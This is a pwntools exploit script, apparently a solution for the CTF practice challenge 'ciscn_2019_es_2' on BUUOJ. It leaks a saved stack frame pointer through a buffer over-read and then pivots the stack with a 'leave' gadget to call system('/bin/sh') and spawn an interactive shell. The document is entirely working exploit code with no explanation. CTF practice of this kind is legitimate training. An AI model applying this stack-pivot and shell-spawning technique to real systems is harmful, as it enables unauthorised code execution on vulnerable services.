from pwn import *
from struct import pack
from LibcSearcher import *

# Interface
local = True
os_level = 32
binary_name = 'ciscn_2019_es_2'
remote_addr = 'node5.buuoj.cn'
port = 29307

if local:
	p = process("./" + binary_name)
	e = ELF("./" + binary_name)
	# libc = e.libc
else:
	p = remote(remote_addr, port)
	e = ELF("./" + binary_name)
	# libc = ELF("libc-2.23.so")

if os_level == 64:
	context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
	context(log_level='debug', os='linux', arch='i386', bits=32)
else:
	print('Error os!!!')
	exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

def z(a=''):
	if local:
		gdb.attach(p, a)
		if a == '':
			raw_input()
	else:
		pass


ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sla = lambda delim, data: p.sendlineafter(delim, data) 
show = lambda x:log.success(x)
slp = lambda x:sleep(x)

leave = 0x08048562
# Main
if __name__ == "__main__":
	system = e.plt['system']
	payload = b'a'*0x24 + b'b'*0x4
	sd(payload)
	#gdb.attach(p)
	ru('bbbb')
	main_ebp = u32(rc(4))
	show(hex(main_ebp))
	payload = b'a'*4 + p32(system) + p32(0) + p32(main_ebp - 0x28) + b'/bin/sh'
	payload = payload.ljust(0x28,b'\x00')
	payload += p32(main_ebp - 0x38) + p32(leave)
	sd(payload)
	p.interactive()
